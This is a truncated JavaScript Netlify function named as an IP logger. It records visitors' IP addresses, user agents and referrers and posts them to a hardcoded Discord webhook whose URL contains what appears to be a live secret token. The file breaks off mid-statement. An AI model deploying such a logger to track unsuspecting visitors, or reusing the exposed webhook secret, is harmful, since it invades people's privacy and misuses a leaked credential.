// netlify/functions/ip-logger-discord.js (V4 - The Last Resort)

exports.handler = async (event, context) => {
    const clientIp = event.headers['x-forwarded-for'] || event.headers['cf-connecting-ip'] || 'UNKNOWN';
    const userAgent = event.headers['user-agent'] || 'N/A';
    const referrer = event.headers['referer'] || 'N/A';

    const logData = {
        timestamp: new Date().toISOString(),
        ip_address: clientIp,
        user_agent: userAgent,
        referrer: referrer,
        path: event.path,
        method: event.method,
    };

    const discordPayload = {
        content: `🚨 **[ACCESS LOG]** 🚨\n*Attempted request logged.*`,
        embeds: [
            {
                title: `🌐 Client Connection Report`,
                fields: [
                    { name: "IP Address", value: `\`${logData.ip_address}\``, inline: true },
                    { name: "Method", value: `\`${logData.method}\``, inline: true },
                    { name: "Path", value: `\`${logData.path}\``, inline: true },
                    { name: "User Agent", value: `\`${logData.user_agent.substring(0, 100)}...${logData.user_agent.length > 100 ? '' : ''}\``, inline: false },
                    { name: "Referrer", value: `\`${logData.referrer}\``, inline: false },
                ],
                color: 0x3498db
            }
        ]
    };

    // !!! CRITICAL FAILURE POINT: The webhook URL is now hardcoded. !!!
    const webhookUrl = 'https://discord.com/api/webhooks/1508453448100741171/8MPtC2QPhiGPjD1RR2mVEEC1dkJGiUAe0w761Xv7Xj5vhkF1dEhQydFrf-tGmG52K52t';

    try {
        console.log("Attempting to send payload to Discord...");
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(discordPayload)
        });
        
        if (!response.ok) {
             const errorText = await response.text();
             console.error(`!!! LOGGING FAILURE !!! Discord API rejected request
